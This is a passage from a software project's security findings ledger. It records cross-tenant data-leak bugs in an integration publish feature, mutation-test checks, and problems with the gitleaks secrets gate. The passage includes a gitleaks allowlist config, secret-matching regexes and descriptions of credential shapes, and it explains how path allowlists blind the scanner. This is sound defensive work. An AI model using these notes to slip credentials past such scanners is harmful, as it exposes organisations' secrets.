  mutant dies here too (measured: reddens 1). **The rule: a test that imports the constant it checks
  pins that constant's NAME, never its VALUE.**

- **`four-claims-that-outlived-the-code-justifying-them`** (**FIXED 2026-08-20**, S1 round six,
  **MINOR x4**, documentation-only). (1) `shared/src/integrations.ts`'s `discardActionEvidence`
  descriptor still said a row is *"collected when the action stops resolving"* - the mechanism round
  five DELETED - and omitted the TTL that is now the only automatic collector. This is the SHIPPED
  CONTRACT FILE, the first place a contract reader looks, and it was the sixth copy of a claim whose
  other five had been rewritten. (2) `service.ts`'s `deleteConfig` claimed the exclusion list is read
  after the delete *"so the list is what the resolver would see now"* - a consequence the code cannot
  have, in the function that performs the module's widest delete: that branch runs only when `c` is
  the custodian-less row, so `c` is filtered out of the list either way. Measured: hoisting the read
  above `integrationConfigs.delete` leaves 13/13 green. Corrected to say the ordering is inert, why,
  and what IS load-bearing (the `id !== ''` filter). (3) `listForIntegration`'s docblock called it
  *"the detail page's read"* while having **no production caller** - S2/S3 lives on another branch -
  so a reader could mistake pinned surface for a covered production path; now stated, with a note to
  delete the paragraph when the page mounts. (4) `EVIDENCE_RETENTION_DAYS`'s docblock now names its
  enforcing case.
- **`s6-the-publish-mechanism-had-no-door`** (CLOSED 2026-08-20, HIGH, a whole reviewed subsystem
  unreachable in production). Slice E2 built and tested the publish scrub, the frozen cross-org
  snapshot, the supersede protocol, the dry-run preview and the author-initiated submit-for-review
  window - and shipped none of it with an HTTP route. `previewPublish`, `publishDefinition`,
  `requestPublish`, `withdrawPublishRequest` and `listPublishRequests` had ZERO non-test callers, so
  the one thing that opens a tenant row to a non-member platform reviewer (`isDefinitionVisibleTo`'s
  submit branch) could never be opened, and the review queue behind it had never been reachable. The
  only way to publish anything cross-org was `POST /definitions/:id/global`, which flips
  `visibility` WITHOUT writing a snapshot - so every publication the product could actually perform
  landed on the read-time floor rather than the reviewed, model-passed artifact. Closed with five
  descriptors and five thin routes (three `user`, two `super-admin`, none `user-or-key`), journaled
  in `docs/decisions.md`.

- **`s6-a-published-action-was-a-spread-not-a-whitelist`** (CLOSED 2026-08-20, MEDIUM, latent
  cross-org disclosure the D5 decision assumed away). `packageConfigFromDoc` whitelists the package
  fields of a published snapshot and was read as covering the whole artifact. It did not:
  `actionsWithoutRecipes` SUBTRACTS `recipe` and copies the rest of each action object through, and
  `IntegrationAction` is an open superset - so any other field on an action rode into the frozen
  snapshot and out to every organisation. Found while proving D5's "promotion carries no evidence BY
  CONSTRUCTION" from the publish side: a fixture planting evidence- and feedback-shaped fields on the
  actions saw five of them arrive in the snapshot, one carrying a user id. Nothing writes such a
  field today (evidence and feedback are separate tenant-scoped collections), so this was latent
  rather than live - but per-action evidence is the obvious place to put per-action evidence, and the
  structural argument the decision rests on was not structural at the level it needed to be. Closed
  with `publishableActionOf`, a whitelist over the twelve declared package fields plus the projected
  `authoring`. Verified by mutation: restoring the spread reddens two cases of
  `tests/security/publish-doors-isolation.test.ts`.

- **`s6-identifying-provenance-rode-into-the-published-snapshot`** (CLOSED 2026-08-20, MEDIUM,
  cross-tenant identity + unscanned free text on a permanent artifact). `authoring.authoredBy`,
  `authoring.trustedBy` (user ids in the AUTHORING org), `authoring.goal` (the author's prose) and
  `verification.checks[].detail` were published verbatim to every organisation, permanently. `goal`
  is additionally the one free-text field on the artifact that `FREE_TEXT_PATHS` does not name, so
  the chokepoint model pass - the second net that exists for exactly this content - never saw it.
  Closed with `publishableAuthoringOf`, which drops the four and keeps the trust semantics. The
  half that had to be kept: an ABSENT authoring record reads as human-written and therefore TRUSTED
  (`authoringStateOf` → `'none'` → `isTrustedAction` true), so scrubbing the record wholesale would
  have promoted every provisional action to trusted for every consuming org - the write gate opened
  by a scrub. The suite carries that case explicitly, and `authoredBy`/`goal`/`trustedBy` become
  optional on the api-internal type so the omission is expressed rather than cast away.

- **`s6-the-publish-request-note-left-the-tenant-unscrubbed`** (CLOSED 2026-08-20, LOW-MEDIUM, new
  egress created by this slice). `publishRequest.note` had existed since E2 with no writer. Mounting
  the submit door made it a real field: free text a person types, read by a super-admin who is not a
  member of their org. The first implementation scrubbed it with `scrubSecretText` - the READ-PATH
  egress rule - and the security suite measured a pasted vendor key surviving it in prose. It now
  goes through `scrubPublishText`, the same publish floor the artifact it argues for gets (read-path
  scrub + strict credential-line rule + blanket literal-secret scan), then a 1000-character cap.
  Scrubbed at the route rather than in the store, because `definition-store.ts` deliberately holds no
  runtime dependency on the modules that own the scrub.

- **`s6-the-review-queue-carried-tenant-content-raw-across-an-org-boundary`** (CLOSED 2026-08-20,
  HIGH, cross-tenant credential disclosure on the one unscrubbed cross-org read). `publishQueueEntry`
  returned `doc.displayName` and `doc.key` verbatim to a platform super-admin who is not a member of
  the authoring org, on the strength of a claim - repeated in the route comment, `docs/decisions.md`
  and the 12-org-tenancy annotation - that the queue "carries no content". Both fields ARE content:
  `packageConfigFromDoc` puts them in the published package config and `applyPublishFloor` walks
  them, so the publish redacts a pasted key inside either one. PROVEN LIVE: an org-A definition whose
  `displayName` carried a pasted Stripe-style live key - described by SHAPE, an `sk_live_` prefix over
  a 32-character body, and deliberately NOT reproduced here, because a ledger entry about a credential
  leak is the last place to write a credential-shaped literal - was submitted for review and served to
  org B's super-admin as that exact string, while the published snapshot of the same row read
  `CRM [REDACTED]` in its place. The queue was therefore a strictly WIDER read of tenant content than
  the preview it is documented as being narrower than - and it is the surface with no per-row
  admission at all.
  Closed by building every content field of the entry from `applyPublishFloor(...).content.config`
  rather than from the document, so the property holds for fields added later by where they are read
  from. The note is scrubbed on the way out too, which is a DIFFERENT property from the submit
  route's scrub (that one keeps a credential out of the database; this keeps it out of another org
  whatever wrote the row) and has its own failing test. Verified by mutation: restoring the raw
  `doc.displayName`/`doc.key` read reddens one case, restoring the raw note reddens another.

- **`s6-the-note-cap-test-could-not-fail`** (CLOSED 2026-08-20, test-quality). "The note is CAPPED
  server-side, not merely bounded by the schema" submitted EXACTLY
  `PUBLISH_REQUEST_NOTE_MAX_CHARS` characters through the route - a length the zod schema already
  allows - so a server-side cap and a missing one answered identically. It was worse than that: the
  string was `'a'.repeat(1000)`, and a 1000-character run of `a` matches the floor's `LONG_HEX_RE`,
  so `scrubPublishText` replaced the whole note with the 10-character `[REDACTED]` and the
  `<= 1000` assertion was true by a mile whatever the cap did. Closed by moving the cap to
  `requestPublish` - the ONE place the note is written, and the only place a string longer than the
  bound can arrive, since the wire refuses one - and asserting the stored length as an EQUALITY
  against a genuinely over-long, non-secret-shaped string, with the route's at-the-bound case kept
  as the reachability half. Verified by mutation: dropping the `.slice` reddens it (1500 vs 1000).

- **`s6-two-gates-with-only-the-outer-one-exercised`** (CLOSED 2026-08-20, test-quality; the pattern
  matters more than the two instances). Two of this slice's gates were duplicated across a route and
  a store, and in both cases only the route was reachable from the suite, so the store half could be
  deleted with everything green.
  - `POST …/publish` - removing `requireRole('super-admin')` was a SURVIVING MUTANT: for a row the
    caller can see, the route gate and the store's `visibilityWriteVerdict` both answer 403. Closed
    by asserting the ORDER instead of the status: middleware refuses before the handler runs and so
    before any row is looked up, so the route bar answers the same 403 for an id that names nothing,
    where the store would answer a 404. Verified by mutation: without `requireRole` the missing-id
    case answers 404.
  - `listPublishRequests`' `if (actor.role !== 'super-admin') return []` - unreachable from HTTP
    because the queue route's `requireRole` sits in front of it. Closed by calling the store directly
    with a user, an org-admin and a foreign user, with the super-admin control asserted first.
    Verified by mutation: DELETING the tenancy filter reddens it (Rule 5's required proof).

  The general lesson, recorded because it will recur: two layers where only one is exercised reads as
  belt-and-braces and is one belt. A duplicated gate needs a test that can only be satisfied by the
  layer it names - otherwise the redundant layer is documentation, and it will be removed one day by
  someone who runs the suite and sees green.

- **`s6-a-secret-shaped-definition-key-crosses-orgs-raw-on-the-published-read-path`** (CLOSED
  2026-08-21 at the publish door; the original entry was WRONG in two places and is corrected here
  rather than extended). `publishedViewOf` restores `key: doc.key` raw over the floor-scrubbed
  `config.integrationKey`, deliberately - "a snapshot never renames the row", and the registry
  resolves BY key, so redacting it there would make the published integration unresolvable for every
  consuming org. The key is therefore the one package field a snapshot CANNOT clean, and a credential
  in it reaches every consuming org verbatim through the ordinary global read.

  **CORRECTION 1 - THIS SLICE MADE IT INVISIBLE TO THE ONLY HUMAN IN THE LOOP, and the entry did not
  say so.** Round two began building the queue's content fields off the publish floor, which is right:
  the queue crosses an org boundary. The consequence for THIS field went unnoticed. Measured
  2026-08-21: the reviewer's queue showed the key as `[REDACTED]` while a third org's
  `GET /api/v1/integrations` showed the literal. "The queue is now narrower than the publish for this
  field, which is the safe direction" was exactly backwards - narrower on the REVIEW surface and wider
  downstream is the unsafe direction, because the narrowing removes the only signal the approver had.

  **CORRECTION 2 - THE PROPOSED REMEDY ALREADY EXISTED, AND WOULD NOT HAVE WORKED.** "The real fix is
  a charset constraint on `key` at the save path": `definition-save.ts` has carried one from the
  start - `SAVE_KEY_RE = /^[a-z0-9][a-z0-9-]{1,48}$/`, the only use of that regex in the repo, applied
  to every builder save. It does not close this, because a charset rule and a credential rule are
  different rules. A real Slack bot token is lowercase letters, digits and dashes, so
  `xoxb-<digits>-<20 lowercase>` satisfies `SAVE_KEY_RE` AND `publish-scrub.ts`'s own
  `VENDOR_SECRET_RE`. The exposure was always reachable through the ordinary production chain - save,
  share to `org`, submit, publish - with no exotic key and no unusual writer, which is what the new
  contract case exercises.

  **AND THE OBVIOUS SUSPECT IS NOT THE WRITER, checked rather than assumed.** `IntegrationKeyParams`
  is `z.string().min(1).max(120)` with no charset at all, and `persistAuthoredAction`'s fork
  (`integration-achieve.ts`) writes `key: integrationKey` straight from that path param on a
  `user-or-key` route - which reads like a way for a gateway key to mint an arbitrary key. It is not:
  that branch is reached only when `resolveAuthoringTarget` has already resolved a FOREIGN row for the
  key, which by the A1 gate is a `global` one, so the string must byte-equal a key that already exists
  globally. The fork PROPAGATES a key into a new `private` row and cannot introduce one. Recorded
  because it is where a reader looks first, and because a wrong writer in a ledger sends the next fix
  to the wrong file.

  **CLOSED AT THE BOUNDARY, WHICH IS WHERE THIS FIELD IS ACTUALLY DECIDED.** `publishDefinition` now
  compares the scrub's OWN output for `integrationKey` against the stored key and refuses when they
  differ (`key-redacted` -> `SECRET_GUARD_BLOCKED` 422), on both doors onto the tier. No new
  predicate: the rule stays `applyPublishFloor`'s and this is only the observation that it fired on the
  one field a snapshot cannot carry. Nothing is tightened at the save path, so no stored row becomes
  unsavable and there is no migration - a row with such a key keeps working inside its own tenant,
  which is the only place it should ever have worked. The queue's `[REDACTED]` key is now a refusal
  coming rather than a blindfold, and `IntegrationPublishQueueEntry.key` says so. Verified by
  mutation: dropping the refusal reddens 1.

- **`s6-a-test-fixture-tripped-the-secrets-gate`** (CLOSED 2026-08-20, LOW, gate hygiene). The S6
  contract suite wrote its planted credential as a LITERAL,
  `const PLANTED_SECRET = 'sk_live_…'`, and `npm run gate:secrets` flagged it as a stripe access
  token. Its sibling `tests/security/publish-doors-isolation.test.ts` states the rule in its own
  header - "sentinels are COMPOSED at runtime, never literals, the gitleaks gate must keep firing on
  real pasted keys" - and the contract suite broke it. A fixture that trips the secrets gate makes
  that gate's output something people learn to skim, which is the only way it can fail to catch a
  genuinely pasted key. Closed by composing the same bytes at runtime; the floor sees an identical
  value, and the cases across both files stay green.

  ROUND FOUR FINISHED IT, because composing the fixture had NOT made the gate green and the round
  that did it recorded the remainder only here. `gitleaks detect` - what `npm run gate:secrets` and
  the `security-gates` CI job both run - scans git HISTORY, not the working tree, so the literal
  stayed reachable in the commit that introduced it and the job stayed red on the PR however clean
  the tree looked. That is the trap worth carrying forward: for a history-scanning gate, a follow-up
  commit is not a fix. MEASURED BEFORE: `gitleaks detect --log-opts="main..HEAD"` reported one
  `stripe-access-token` at `tests/contract/integrations-publish.test.ts:110`, while a scan of the
  working tree alone reported none of it - which is exactly how a round can believe it has closed
  this and report clean. Closed by REPLAYING the branch's three commits with the fixture composed
  from the start, so the whole literal exists in no tree and in no diff of the branch; the replay was
  safe because the branch has no upstream. MEASURED AFTER: `--log-opts="main..HEAD"` exits 0 with
  zero findings. Explicitly NOT closed with an entry in `scripts/gitleaks.toml` - that file already
  carries seven allowlisted values and its own warning that each is a deliberate act, and an eighth
  added to quiet a fixture the author controls is how a gate turns into decoration.

  ROUND FIVE FOUND THE SAME LITERAL A SECOND TIME, IN THIS FILE. Round four's replay removed it from
  the FIXTURE and left it in the LEDGER: the write-up of the displayName leak quoted the planted value
  in full, at `docs/findings.md`, in the commit that wrote the entry. Nobody saw it because
  `scripts/gitleaks.toml` allowlists `docs/.*` BY PATH - see the entry below, which is the real
  defect. Closed the same way and no other way could work: the commit was replayed with the ledger
  describing the token by SHAPE ("an `sk_live_` prefix over a 32-character body") and never by value,
  in the ledger text AND in the commit message, which carried it too. **The rule this round adds to
  the one above: the write-up of a credential leak is itself a place credentials leak, and it is the
  place nobody scans, because it is prose.**

  AND THE BACKUP REF WAS THE SAME TRAP AGAIN. `gitleaks detect` scans `--all` refs, so
  `backup/s6-pre-secret-scrub` kept the pre-rewrite commits - and therefore the literal - reachable
  after the replay had removed them from the branch. Verified 2026-08-21 that the ref is the SOLE
  reachability: `git for-each-ref --contains 473fb4e` names only that branch, and no worktree HEAD
  contains it. The only content it preserved was the secret-bearing fixture block and the
  secret-bearing ledger paragraph, both already proved equivalent to their replacements
  (`git diff <replayed> backup/s6-pre-secret-scrub` is those two hunks and nothing else), and the
  reflog still holds the old tip. MEASURED with the CONFIGURED gate, 2026-08-21, all three scopes and
  the commit count read off every one of them: all refs (`npm run gate:secrets` as written) = **2**
  over 792 commits; every ref that will remain once `backup/` is deleted (the four live branches) =
  **1** over 788, that one being the pre-existing `PAGE_STATE_TOKEN` on main below; `main..HEAD`, what
  the PR introduces = **0**.

  **AND THE REFLOG DOES NOT KEEP IT IN THE GATE, which was assumed both ways and is now measured.**
  `gitleaks detect`'s default log-opts is `--all`, and `git log --all` does not read the reflog (that
  needs `--reflog`). Checked against three commits this branch's rewrite orphaned - `f089f37`,
  `5b50a55`, `d0317f9`: each appears in the reflog, is named by NO ref, and is reached by
  `git log --all` zero times. So the reflog keeps the objects alive for GC purposes and contributes
  nothing to the scan; deleting the ref really does take the gate from 2 to 1, with nothing left
  reachable for a reason nobody can name.

  **THE REF MUST BE DELETED: `git -C <worktree> branch -D backup/s6-pre-secret-scrub`.** It was not
  deleted from inside this round: the branch deletion was refused by the sandbox's permission
  classifier, twice, and working around a refused permission is not something to do quietly. Recorded
  here as the one remaining action rather than left as an unexplained red gate.

  **A MEASUREMENT TRAP, recorded because it produced a WRONG CLEAN NUMBER in this very round.** A
  first attempt at the "four remaining refs" scope built the ref list in a shell variable with a
  trailing space and reported `no leaks found`. It had scanned ZERO commits. Only re-running with the
  commit count visible ("788 commits scanned") showed the real answer of 1. A secrets gate that
  scanned nothing is indistinguishable from a secrets gate that found nothing, and this is the third
  distinct way this branch has now been told a clean number by a gate that was not looking. **Read the
  commit count, every time.**

- **`gitleaks-flags-a-deliberately-non-credential-viewstate-fixture`** (OPEN 2026-08-20, LOW, not
  this stream's file). `npm run gate:secrets` also reports `generic-api-key` at
  `api/tests/automation/discovery-replay-acceptance.test.ts:112` - `PAGE_STATE_TOKEN`, a 38-char
  ASP.NET `__VIEWSTATE` lookalike that the suite deliberately holds as NOT a credential (its whole
  point is that `looksLikeLiteralSecret` cannot tell and refuses). It landed on main in `c43a190`
  and belongs to the discovery-replay stream, which is active on this box, so it is reported rather
  than edited from here: touching a sibling's file to fix a false positive trades one problem for a
  merge conflict. The fix is the same one-liner as above - compose it at runtime - and it belongs in
  that stream's next commit. Recorded so the red gate is a known red rather than ambient noise.
  (`gate:secrets` is not in `ci:lane`, so this is not blocking a PR today; `gate:ledger` is likewise
  red on main for unrelated web unit suites marked due/unrun at G9.)

- **`the-secrets-gate-allowlists-docs-and-spec-BY-PATH-and-its-own-config-argues-against-that`**
  (OPEN 2026-08-21, MEDIUM, repo-wide - recorded here because this branch is what proved it, and NOT
  fixed here because the fix has its own blast radius). `scripts/gitleaks.toml` carries a path
  allowlist:

  ```
  [allowlist]
  description = "Spec text, docs, and synthetic test fixtures are not secrets"
  paths = [ '''spec/.*''', '''docs/.*''', '''.*\.example\..*''', '''api/test/fake-daemon/fixtures/.*''' ]
  ```

  **THE FILE ARGUES AGAINST ITSELF FIFTEEN LINES LOWER DOWN.** Explaining why the synthetic security
  fixtures are allowlisted by VALUE, it says: a path allowlist over `api/tests/security/**` "would be
  one line instead of five - and would blind the scanner to a REAL token pasted into a test file,
  which is a normal way credentials escape. Enumerating the values keeps the gate sharp." That
  reasoning is correct and it is the reasoning this allowlist ignores, for two whole trees.

  **AND IT IS NOT HYPOTHETICAL - IT IS WHY THE ENTRY ABOVE EXISTS.** Round four wrote the planted
  `sk_live_` value into `docs/findings.md` while writing up a credential leak, and every gate stayed
  green because of this rule. MEASURED 2026-08-21, same config with only `docs/.*` and `spec/.*`
  removed from `paths`: 8 findings instead of 2. Six of them are under `docs/` and have never been
  seen - the ledger literal (reachable from two commits), a `jwt` in
  `docs/release/evidence/J1-auth/j1-auth.json`, and three `generic-api-key`s elsewhere under
  `docs/release/evidence/`. Whether any of the six is a real credential is exactly the question this
  gate exists to force, and it has never been asked for anything in those two trees.

  **AND THE TRIAGE IS HARDER THAN IT LOOKS, which is why it is a slice and not a one-liner.** Checked
  rather than assumed: all four `docs/release/evidence/` files are GONE FROM DISK - a working-tree
  scan (`--no-git`) of this branch reports exactly one finding, the pre-existing `PAGE_STATE_TOKEN`
  above. They are reachable only in history. So they cannot be fixed by editing a file: each is
  either a VALUE allowlist entry (the `EKOA-SYNTHETIC-` convention the config already documents is
  the tool where the value is genuinely a fixture), or a real credential that must be ROTATED, and
  the path allowlist is the reason nobody has had to decide which.

  **NOT REMOVED IN THIS BRANCH, deliberately.** Dropping the two path entries turns a currently-green
  gate red for six findings in other streams' history - a repo-wide change with a blast radius
  nothing to do with the publish doors. What it needs: a slice that triages the six, allowlists or
  rotates each, and only then deletes the two path entries. Recorded with the measurement so that
  slice starts from a number rather than a suspicion.

- **`s6-a-non-member-super-admin-could-author-the-tenants-publish-request`** (CLOSED 2026-08-20,
  HIGH, cross-org write). `requestPublish` admitted on `canWriteDefinition` alone, which answers TRUE
  for ANY super-admin over a row they can merely SEE. Mounting the submit door brought
  `isDefinitionVisibleTo`'s review-window branch to life, so a super-admin OUTSIDE the authoring org
  can now see a submitted `org` row - and could therefore re-stamp it: `publishRequest.requestedBy`
  became their own user id and the note arguing for publication became their own words. Silent,
  because re-submission is idempotent by design, so the overwrite answered 200 and read exactly like
  the author correcting their own note. `withdrawPublishRequest` already carried the membership guard
  inline; the SUBMIT door had none, and that asymmetry was the defect. Closed by a named term,
  `canWriteOwnPublishRequest` (writability AND `sameOrg`), used by both doors and both layers of each
  - one rule in one place rather than a second inline `!==`, which also upgrades the withdraw's bare
  comparison to the empty-string-safe form. Verified by mutation: deleting the `sameOrg` term reddens
  5 tests across `tests/contract/integrations-publish.test.ts` and
  `tests/security/publish-doors-isolation.test.ts`, including the pre-existing withdraw case. The
  other four mounted doors were checked for the same assumption and are correct as they stand
  (`previewPublish` admits the non-member reviewer deliberately - it is a READ that reveals strictly
  less than the raw row, and it bills the reviewer, not the tenant); so are `PATCH …/visibility`,
  `saveAuthoredDefinition` and `setLessons`, which the new window does not widen.

- **`s6-the-old-global-door-published-cross-org-with-no-snapshot`** (CLOSED 2026-08-20, HIGH,
  cross-org read + bypass of the slice's own publish path). `POST /definitions/:id/global`
  `{global:true}` called `setVisibility(..., 'global')`: the row reached the cross-org tier with NO
  `publishedSnapshot`, and `publishedViewOf` then served every other organisation the author's LIVE
  row through the deterministic read-time floor - the exact state `publishSnapshot`'s single CAS
  write documents itself as existing to prevent. Three concrete costs, each derived from the code:
  the chokepoint MODEL PASS never ran (the floor is layer one of two, and the second net is the one
  that catches credential material written as prose); no provenance was recorded, which propagates,
  since `publishQueueEntry.republish` is `publishedSnapshot !== undefined` and so tells the NEXT
  reviewer this is a first publication while `publishSnapshot` stamps no `supersedes`; and no
  `PUBLISH_SCRUB_VERSION` is pinned, so what consuming orgs read is re-floored by whatever code is
  deployed, with no record of which ruleset any reader got.

  THIS SLICE MADE IT WORSE, which is why it is closed here rather than deferred. Before the submit
  door was mounted nothing in `api/src/` wrote `publishRequest`, so the review-window branch was dead
  code and this route answered the uniform 404 for another tenant's `org` row. Mounting
  `POST …/publish-request` brings the branch to life - deliberately - and thereby hands the
  unscrubbed door its first foreign-tenant rows. Closed by routing `{global:true}` through
  `publishDefinition`, the same function `POST …/publish` calls, so there is ONE way a definition
  crosses an org boundary and it always writes a snapshot. Not gated-and-documented as a second door,
  because both doors had IDENTICAL admission (`visibilityWriteVerdict(row, actor, 'global')`, the
  same call), leaving no narrower principal to gate to; the reasoning is in `docs/decisions.md`.
  `{global:false}` keeps the route alive - un-publishing has no equivalent on the publish door.
  Verified by mutation: reverting the promotion to `setVisibility` reddens 4 contract cases,
  including the invariant that walks every mounted door that can write `visibility`.

- **`s6-round-two-test-quality-fixes-re-verified`** (CLOSED 2026-08-20, informational). The three
  tests round two rewrote were re-measured from scratch this round, each by mutating the source and
  restoring it byte-identically: dropping the store's `.slice` note cap reddens 1; dropping
  `requireRole` from `POST …/publish` reddens 3 (round two's missing-id case plus this round's two
  new pairwise cases); deleting `listPublishRequests`' `role !== 'super-admin'` filter reddens 1.
  All three are genuinely failable. A FOURTH gate of the same class was found unpinned in the same
  sweep and closed: `POST /definitions/:id/global`'s own `requireRole('super-admin')` was a surviving
  mutant after the fold, because every non-super-admin it refuses is one the store would refuse too.
  It is now told apart the same way the publish door's is - middleware answers before any row is
  read, so it answers 403 for an id that names NOTHING where the store must answer 404 - asserted for
  both doors, in both directions of `{global}`, with a super-admin's 404 as the control.

- **`f4b-cas-pairs-are-not-separable-by-any-test`** (OPEN 2026-08-20, informational, a recorded LIMIT
  rather than a defect). `canWriteOwnPublishRequest` is applied twice per door - once as a pre-check,
  once inside the CAS mutator (the E1-review F4b re-assert). Deleting the RULE reddens 5 tests.
  Deleting either APPLICATION alone leaves the suite green: measured, in both directions, not
  inferred. The surviving application produces the identical verdict and identical row state, so the
  mutants are equivalent in effect and no test can distinguish them - the only difference is a wasted
  database round trip. The sibling `tests/security/captured-calls-isolation.test.ts` records the same
  limit for the same pattern. Recorded so a future reader knows the question was asked and where the
  answer runs out; the mitigation is structural, not another test - both applications call ONE named
  predicate, so there is exactly one place the rule can be deleted from.

- **`s6-the-global-doors-retry-became-a-silent-unreviewed-republish`** (CLOSED 2026-08-20, MEDIUM,
  cross-org content replacement created by this slice's own fix). Folding `POST /definitions/:id/global`
  `{global:true}` into `publishDefinition` (MAJOR-2) closed one defect and opened a smaller one at the
  other end of the same call. `visibilityWriteVerdict` permits `global -> global` DELIBERATELY - E2
  narrowed the launch-pad rule from `!== 'org'` to `=== 'private'` precisely so a published artifact
  could be refreshed at all - so a REPEAT of `{global:true}` stopped being the no-op it had always
  been and became a full supersede: re-scrub the author's CURRENT live row, replace the reviewed
  artifact in every consuming org, stamp `supersedes`, with no preview and no reviewer in the loop.
  The trigger is not exotic; it is a retry after a timeout, or a reviewer re-asserting a tier they
  believe is already set. Authority was unchanged - the same principal could have called `/publish` -
  but the route's own contract never said this: `{global:boolean}` answers `{ok, visibility}` and
  reads as a tier toggle. Closed with `PublishScrubOptions.promoteOnly` and a distinct
  `already-published` verdict, judged AFTER the pre-check (so the door gains no existence oracle) and
  from the SAME read the gate used (so no second fetch can disagree with the one that authorised the
  call). It is its own verdict rather than an `ok` carrying `redactions: []` and a synthesised
  `modelPass`, because no scrub ran and there is no honest value for either field. A `global` row
  with NO snapshot is still published here - that state is exactly what MAJOR-2 exists to end.
  Verified by mutation: dropping `promoteOnly` reddens the byte-for-byte snapshot comparison.

- **`s6-the-fold-was-not-in-the-canonical-architecture-doc-or-the-contract`** (CLOSED 2026-08-20, LOW,
  documentation drift on a change of behaviour). MAJOR-2 changed what a mounted route DOES, and said
  so only in `docs/decisions.md`, `docs/findings.md` and the 12-org-tenancy diagram. The architecture
  paragraph still read "Five routes now mount them" and enumerated five; the `setGlobal` descriptor -
  the API contract a client reads - still described "the other super-admin-only publish toggle". A
  reader consulting either canonical source got the pre-fold answer. Closed in both, together with
  the idempotence rule above and an explicit statement of what the "nothing reaches the global tier
  without an artifact" invariant does NOT cover.

- **`s6-the-publish-model-pass-had-no-deadline`** (CLOSED 2026-08-20, LOW-MEDIUM, availability;
  pre-existing exposure WIDENED by this slice, stated plainly). `chokepointModelPass` called
  `completeFast` with no `signal` and no per-call budget, where `llm/gateway.ts`'s `CLASSIFY_BUDGET_MS`
  arms an AbortController for a far smaller call. `scrubForPublish` degrades to the floor when the
  pass THROWS - but a provider that accepts the connection and then never answers is not a throw, so
  there was nothing to catch and the publish waited for as long as the socket stayed open, with a
  super-admin's request held behind it. This was already true of `POST .../publish`; what made it
  worth arming now is that the fold put `POST .../global` `{global:true}` - previously a single store
  write - behind the same call. Closed with `MODEL_PASS_BUDGET_MS` (30 s, generous next to the
  classifier's 3.5 s because this pass reads up to 60 000 characters and emits spans). A timeout is a
  degradation, never a refusal: the floor is the control and `modelPass: {status:'failed'}` is
  recorded on the artifact. Verified by mutation: dropping the signal reddens 3, making the timer a
  no-op reddens 3.

- **`s6-the-review-queue-is-an-unpaginated-cross-tenant-scan`** (PARTLY CLOSED 2026-08-20, LOW; the
  scan narrowed, the pagination RECORDED). `listPublishRequests` filtered `{visibility:'org'}` at the
  database and `publishRequest !== undefined` in JS, so the widest read in the process materialised
  every org-visibility definition of every tenant - with skillMd, lessons, action bodies and config
  schemas attached - to discard almost all of them; and `publishQueueEntry` then runs a full publish
  floor per surviving row. Any authenticated user can add to the submitted subset, so the discarded
  majority grew with the tenant base. The scan half is closed: both terms are now the database's
  (`$exists` matches exactly what the JS predicate matched), and the test observes the SCAN WIDTH -
  the returned items are identical either way, which is how a correct-looking answer hid it - through
  a `RecordingStore` that subclasses the real `Store` and adds only the row count. STILL OPEN: the
  response has no limit and no cursor, so its size grows with the number of tenants that have asked
  at once. Not fixed here because a cursor on `IntegrationPublishQueueResponse` is a Rule 7 contract
  change with an OpenAPI and cortex-cli regeneration behind it; it needs its own slice rather than a
  half-done bound. Verified by mutation: restoring the JS filter reddens 1 (5 rows read where 1 is).

- **`s6-the-global-tier-invariant-was-scoped-to-routes-and-did-not-say-so`** (OPEN 2026-08-20, LOW,
  residual - recorded, not fixed). "Nothing reaches the global tier without an artifact" was the title
  of a test that walks the MOUNTED HTTP routes and nothing else. Two in-process paths sit outside it:
  `legacy-runtime-import.ts`, which writes rows directly, and any in-process
  `IntegrationDefinitionStore.create({visibility:'global'})`. Neither is reachable from the loop, so
  the invariant as stated was wider than the thing proved. The title and the architecture paragraph
  now say what the scope is. NOT closed by widening the invariant to the store, because a `global`
  row with no snapshot is a legitimate legacy state that the READ-PATH fail-safe already handles -
  such a row is served through the deterministic floor, never raw - so forbidding it at the store
  would break the import path rather than fix anything. What is missing is a positive test of that
  fail-safe from the import side, and it belongs to whoever owns `legacy-runtime-import.ts`.

- **`s6-round-three-and-four-test-quality-re-verified`** (CLOSED 2026-08-20, informational; a
  RE-MEASUREMENT, not a claim carried forward). The three tests round two made failable were
  re-checked from a clean tree in round four, each mutation restored and md5-verified: the note cap
  (dropping the store's `.slice` reddens 1, 1500 vs 1000), `POST .../publish`'s `requireRole`
  (dropping it reddens 3, at the 404-vs-403 ordering assertion), and `listPublishRequests`' own
  `role !== 'super-admin'` filter (DELETING it reddens 1 - the Rule 5 proof). The fourth gate of that
  class, `POST .../global`'s `requireRole`, reddens 2. AND THE ONE THAT DID NOT HOLD UP IS RECORDED AS
  A DISCLOSURE RATHER THAN DEFENDED: the E1-F4b pre-check / in-mutator pair was re-measured here and
  is genuinely NOT separable - deleting the pre-check application alone leaves 50/50 green, and
  deleting the in-mutator application alone leaves 50/50 green, because the survivor reaches the
  identical verdict and row state. The mitigation is structural (both applications call ONE named
  predicate, so there is one place to delete from) and no test is claimed for it.
  **ROUND FIVE WENT FURTHER, because the disclosure above only covered SINGLE deletions and an
  independent verifier asked the obvious next question.** Deleting BOTH in-mutator re-asserts at once
  also leaves the suite green (0 red across 55 cases), and so does deleting only the VISIBILITY term
  of both while leaving the membership term (also 0 red) - so nothing in this estate pins the
  in-mutator re-assert on these two doors at all. The membership half is not merely untested, it is
  STRUCTURALLY UNREACHABLE, which is the more useful fact: `canWriteOwnPublishRequest` reads
  `doc.orgId`, `doc.userId` and the actor, and for a fixed `_id` the first is pinned by identity
  (`definitionIdFor(orgId, key)`) while the second is carried forward verbatim by every writer in the
  repo (`definition-save.ts:136`, `integration-achieve.ts:656` and `:797` all re-save
  `userId: existing.userId`). No write can flip that term between the pre-check and the mutator, so no
  honest test can redden it. The VISIBILITY term is reachable in principle - visibility changes all
  the time - but exercising it needs a genuine interleave inside `Store.update`'s CAS window, which
  nothing here constructs. **Both terms are KEPT** and neither is claimed as tested: a defence-in-depth
  check removed because it is unreachable today is how the writer that changes `userId` tomorrow finds
  an open door. Separately,
  `sendPublishRefusal`'s `model_pass_required` arm is DEAD from the `/global` door, which never asks
  for `requireModelPass`; the docblock now names that door rather than implying coverage.

- **`s6-the-publish-decided-in-the-wrong-unit-a-row-where-consumers-read-a-key`** (CLOSED 2026-08-21,
  MEDIUM, a cross-org write that no consumer could ever read, answered 200). Everything the reviewer
  is shown before approving is derived from ONE `(org, key)` row's `publishedSnapshot`: `republish` is
  literally `publishedSnapshot !== undefined`, and `supersedes` is stamped from the same field. What
  approving DOES is decide what every OTHER organisation resolves for a KEY. MEASURED THROUGH THE REAL
